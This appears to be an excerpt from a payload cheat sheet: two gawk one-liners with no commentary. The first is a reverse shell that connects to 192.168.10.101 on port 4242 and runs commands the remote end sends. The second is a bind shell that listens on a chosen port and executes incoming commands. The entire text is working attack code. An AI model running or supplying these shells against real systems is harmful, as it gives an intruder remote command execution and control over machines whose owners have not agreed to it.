awk 'BEGIN {s = "/inet/tcp/0/192.168.10.101/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null


"$(awk -v LPORT=$LPORT 'BEGIN {s = "/inet/tcp/" LPORT "/0/0";while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;while (c && (c |& getline) > 0) print $0 |& s; close(c)}}')"
